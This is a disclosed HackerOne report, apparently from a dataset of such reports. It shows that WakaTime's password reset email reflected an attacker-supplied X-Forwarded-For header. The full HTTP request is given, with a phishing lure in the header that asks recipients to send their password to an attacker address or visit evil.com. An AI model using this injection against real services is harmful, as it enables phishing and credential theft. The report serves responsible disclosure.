---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '244677'
original_report_id: '244677'
title: Add arbitrary content to Password Reset Email
weakness: Code Injection
team_handle: wakatime
created_at: '2017-06-30T08:59:53.936Z'
disclosed_at: '2017-07-20T15:36:20.840Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 23
tags:
- hackerone
- code-injection
---

# Add arbitrary content to Password Reset Email

## Metadata

- HackerOne Report ID: 244677
- Weakness: Code Injection
- Program: wakatime
- Disclosed At: 2017-07-20T15:36:20.840Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi,

I noticed the inclusion of `IP Address` in the email sent for password reset. Then I tried including a new *header*, `X-Forwarded-For` to see if the IP Address in the email could change. Though it didn't change it but it did include whatever value that was injected in the header.

###Request
```
POST /api/v1/users/reset_password HTTP/1.1
Host: wakatime.com
X-Forwarded-For: _For precaution, send your email and new password to ███@email.com or visit www.evil.com.
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
X-CSRFToken: [Token]
X-Requested-With: XMLHttpRequest
Referer: https://wakatime.com/reset_password?email=████@gmail.com
Content-Length: 35
Cookie: [Cookie]
Connection: close

{"email":"EmailAddress"}
```

What is included in the request is 
> X-Forwarded-For: _For precaution, send your email and new password to ███████@email.com or visit www.evil.com.

Then the reflection in email is shown below,
{F209902}

Best Regards,
Shuaib

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
